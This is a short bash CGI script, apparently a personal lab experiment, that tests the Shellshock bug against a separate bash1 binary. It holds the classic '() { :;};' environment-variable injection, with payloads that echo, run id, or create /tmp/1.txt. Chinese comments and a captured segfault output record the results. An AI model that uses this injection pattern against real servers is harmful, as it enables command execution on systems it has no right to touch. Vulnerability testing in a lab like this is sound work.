#!/bin/bash1


echo "Content-type: text/html"
echo ""
echo '<html>'
echo '<head>'
echo '<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">'
echo '<title>Hello World</title>'
echo '</head>'
echo '<body>'
echo 'Hello World'
#env var='() { :;}; echo vulnerable' bash1 -c "echo "----"; env; echo this is a test; echo "-----""
#env var='() { :;}; id' /bin/bash1 -c "echo "----"; env; echo this is a test; echo "-----""

# 果真 创建了文件 /tmp/1.txt
# 不过这个还不能真正模拟远程执行shell的 情况
env var='() { :;}; touch /tmp/1.txt' /bin/bash1 -c "echo "----"; env; echo this is a test; echo "-----""

echo '</body>'
echo '</html>'
exit 0



# 会报错 不知道为啥
# root@debian32-1:/usr/lib/cgi-bin/shell# ./shellshock.sh
# Content-type: text/html
# 
# <html>
# <head>
# <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
# <title>Hello World</title>
# </head>
# <body>
# Hello World
# ./shellshock.sh: line 17: 32646 Segmentation fault      env var='() { :;}; touch /tmp/1.txt' /bin/bash1 -c "echo "----"; env; echo this is a test; echo "-----""
# </body>
# </html>
# 
